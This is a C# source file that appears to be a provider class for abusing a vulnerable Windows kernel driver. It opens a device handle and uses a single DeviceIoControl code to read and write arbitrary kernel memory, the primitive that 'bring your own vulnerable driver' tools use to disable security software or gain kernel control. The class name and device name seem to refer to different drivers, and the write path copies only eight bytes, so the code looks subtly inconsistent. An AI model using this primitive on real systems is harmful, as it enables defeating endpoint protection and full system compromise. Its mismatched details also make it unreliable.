using System;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;

public class PdFwKrnlDriver : IProvider
{
	private const string DeviceName = "\\\\.\\Htsysm72FB";
	private SafeFileHandle _handle;

	//[StructLayout(LayoutKind.Sequential)]
	//private struct RWStruct
	//{
	//	public ulong Address;
	//	public ulong Value;
	//}

	public bool Open()
	{
		_handle = NativeMethods.CreateFile(DeviceName, FileAccess.ReadWrite,
			FileShare.ReadWrite, IntPtr.Zero, FileMode.Open, 0, IntPtr.Zero);
		return !_handle.IsInvalid;
	}

	public void Close()
	{
		_handle?.Dispose();
	}

	public bool ReadKernelMemory(ulong address, byte[] buffer, int size)
	{
		var request = new NativeMethods.RWStruct { Address = address };
		int bytesReturned = 0;
		return NativeMethods.DeviceIoControl(_handle, 0x9C4060CC,
			ref request, Marshal.SizeOf<NativeMethods.RWStruct>(),
			buffer, size, ref bytesReturned, IntPtr.Zero);
	}

	public bool WriteKernelMemory(ulong address, byte[] data, int size)
	{
		var request = new NativeMethods.RWStruct
		{
			Address = address,
			Value = BitConverter.ToUInt64(data, 0)
		};
		int bytesReturned = 0;
		return NativeMethods.DeviceIoControl(_handle, 0x9C4060CC,
			ref request, Marshal.SizeOf<NativeMethods.RWStruct>(),
			IntPtr.Zero, 0, ref bytesReturned, IntPtr.Zero);
	}
}
